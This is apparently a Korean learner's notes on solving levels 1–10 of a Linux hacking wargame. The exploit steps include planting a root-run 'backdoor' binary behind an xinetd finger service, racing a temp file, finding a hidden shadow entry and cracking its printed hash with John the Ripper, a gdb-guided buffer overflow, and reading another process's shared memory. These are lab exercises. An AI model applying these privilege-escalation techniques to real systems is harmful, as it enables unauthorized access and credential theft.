>> 배운 명령어들

level 1

2 > /dev/null >> 발생한 표준에러를 휴지통으로 보내라(깔끔하게 정리됨)

level 2

/bin/bash 를 통해 쉘에 접근할수있음 >>(즉 bash 를 통해 레벨 1에서 레벨2의 쉘을 획득할수있음)


level 3

;(세미콜론)을 사용하여 동시에 여러 명령어를 사용할수있다.

문자열 형태로 명령어를 전달하려면 "" 를 사용하면된다.

level 4

파일을 열어 읽어보고 파일을 분석한다.

service finger >> 서비스의 이름으로서 /etc/service 파일에 있는 서비스 명으로 선택하는것을 권장

disable = no >> 데몬을 비활설화 하지 않음   disable = yes >> 할당 서비스를 기동하지 않음

flags = REUSE >> 서비스 포트가 사용중인 경우 해당 포트의 재사용을 허가

socket_type = stream >> TCP/IP 프로토콜 선택

wait = no >> 이미 서비스가 연결된 상태에서 다른요청이 들어오면 바로 응답함 , 즉 이 파일은 동시에 다수의 접속이 가능함

user = root >> 해당 데몬이 root 계정의 권한으로 실행됨

server = /home/level4/tmp/backdoor >> xinetd에 의해 실행될 데몬 파일

log_on_failure +=USERID >> 정상적인 기동에 실패한 경우 USERID를 로그에 기록

즉 파일을 분석하고 cat /etc/services | grep finger 을 이용해서

해당 파일이 연결된 tcp 포트를 확인하고 netstat -na 를 통해 포트가 열려있는지
확인후 해당 포트로 공격한다.

만약 해당 디렉터리안에 해당 파일이 존재하지않는다면 해당 디렉터리에 만들어주면 된다.

>> vi 편집기로 c++ 코드를 입력해서 

ex)

#include<stdio.h>
#include<stdlib.h>

int mian(void)
{
	system("my-pass");
}

를 만들어줘서 my-pass를 만들어준다.

그리고 gcc -o backdoor backdoor.c

         gcc -o (만들 파일 이름) (사용할 파일이름)

으로 컴파일 해주고 finger @localhost 를 입력해서

레벨 5의 비밀번호를 따낸다.

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

백도어는 실행하는 위치에 따라서 로컬백도어와 원격 백도어로 분류할수있다.  

로컬백도어보다 원격백도어가 공격자에게는 훨씬 유용하다.

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@


level 5

hint를 보고 임시파일이 생성된다고 한다.

파일을 실행했지만 임시파일이 생성되지 않아서 직접 같은 이름에 내용은 아무렇게나
하고 파일을 만들고 다시 파일을 실행시켜보았다. 그랬더니 덮여쓰기가 되어서
패스워드가 나왔다.



level 6 

컨트롤 c 를 누르면 쉘이 나와야하는데 쉘이 안나온다. 집에서해보자


level 7

1. 패스워드는 가까운곳에..

2. 상상력을 총동원하라.

3. 2진수를 10진수를 바꿀 수 있는가?

4. 계산기 설정을 공학용으로 바꾸어라.


계산기 설정을 공학용으로 바꾸고 해당 명령을 실행하고 

-(1) _(0) 으로 본다면 총

109(10)
97(10)
116(10)
101(10)

이나온다 이걸 아스키코드로 바꾼다면

mate 가나오므로  다시 실행시켜서 mate 를 입력하면 비밀번호가 나온다.


level 8

쉐도우 파일이 숨겨져있음 용량이 2700임 그러면 특정용량 즉 size로 찾으면됨

find / -size 2700c 2>/dev/null 을 입력해서 수상한 txt파일을 발견한다.

그리고 cat 으로 실행한다.

그랬더니

level9:$1$vkY6sSlG$6RyUXtNMEVGsfY7Xf0wps.:11040:0:99999:7:-1:-1:134549524

가나오는데 현재 비밀번호 부분이 암호화 되어있기때문에

존더리퍼 윈도우버전으로 복호화 시킨다.

존더리퍼를 다운받고 run 폴더에 넣은다음 텍스트폴더를 하나만들어서 거기다가 암호를 넣는다.

그리고 john -show pass.txt(예시) 를 입력하면 암호부분이 해석되서 나타난다.



level 10


gdb -q bof 로 파일 분석이 가능하다.

(gdb) set disassembly-flavor intel

(gdb) disas main

Dump of assembler code for function main:
0x08048420 <main+0>:    push   ebp
0x08048421 <main+1>:    mov    ebp,esp
0x08048423 <main+3>:    sub    esp,0x28
0x08048426 <main+6>:    and    esp,0xfffffff0
0x08048429 <main+9>:    mov    eax,0x0
0x0804842e <main+14>:   sub    esp,eax
0x08048430 <main+16>:   sub    esp,0xc
0x08048433 <main+19>:   push   0x8048554
0x08048438 <main+24>:   call   0x8048350 <printf>
0x0804843d <main+29>:   add    esp,0x10
0x08048440 <main+32>:   sub    esp,0x4
0x08048443 <main+35>:   push   ds:0x8049698
0x08048449 <main+41>:   push   0x28
0x0804844b <main+43>:   lea    eax,[ebp-40]	-----buf 시작점
0x0804844e <main+46>:   push   eax
0x0804844f <main+47>:   call   0x8048320 <fgets>
0x08048454 <main+52>:   add    esp,0x10
0x08048457 <main+55>:   sub    esp,0x4
0x0804845a <main+58>:   push   0x2
0x0804845c <main+60>:   push   0x804856a
0x08048461 <main+65>:   lea    eax,[ebp-24]	----- buf2 시작점
0x08048464 <main+68>:   push   eax


buf 와 buf2 의 차이가 16이므로 16만큼 더 글자수를 채워주고 go를 입력하면 
버퍼오버플로우가 발생해서 레벨10 쉘로 넘어간다.


level 10

단순히 정보 1. 공유메모리를 이용하여 만듦  2. key_t 값은 7530 이 두가지 정보 가지고
레벨 11의 권한을 얻어야한다.

새로운 폴더하나가 만들어졌는데 그것은 루트권한이라 우리가 접근하지 못한다.
따라서 프로그램이 시작될떄 자동으로 시작되도록 등록하는 설정에 해당파일이
존재할수 있으므로 확인해준다

명령어 >> cat /etc/rc.d/rc.local

입력하면 맨아래 레벨 10으로 
#run level10 란에

/home/level10/program/level10 이있다 하지만 이경로는 루트 권한이라 
접근하지못한다.

그래서 level10 이라는 이름으로 실행중인 프로세스가 있는지 확인해본다

ps -ef | grep level10			>> 실행중인 프로그램 찾기



또 이문제를 풀려면 공유메모리의 개념에 대해서 알고있어야한다.

공유메모리 >> 여러프로세스에서 동시에 접근할수있는 메모리이다.
(key_t 값은 공유메모리를 구별하는 식별번호 > 즉 공유메모리의 위치)

공유메모리 관련 소스코드	-1- ( 나중에 2랑 비교해보기)

#include<stdio.h>
#include<sys/shm.h>
#include<sys/tyoe.h>

#define SIZE 1024
int main(){
    char buf[SIZE];
    int shareMemoryid;
    void*shareMemory=(void*)0;
    key_t key = 7530;

    shareMemoryid = shmget(key,SIZE,0666);
    shareMemory = shmat(shareMemoryid, (void*)0, 0);
    memcpy(buf,shareMemory,SIZE);
    shmdt(shareMemory);

    printf("%s\n", buf);
    return 0;

}

!!'''#shmdt(shareMemory) >> (프로세스에서 공유메모리의 연결을 분리한다.)'''!!





공유메모리 소스 -2-

#include<stdio.h>
#include<sys/shm.h>
#include<sys/ipc.h>
#include<sys/types.h>

int main()
{
        int shmid;
        char*shared_memory;
        shmid=shmget(7530,1024,0666);
        shared_memory=shmat(shmid,NULL,0);
        printf("shared_memory is : %s\n", shared_memory);
        shmdt(shared_memory);
        return 0;
}


일단 컴파일 할때는 -2-로 했음

따라서 레벨 11로 가는 비밀번호를 알아냄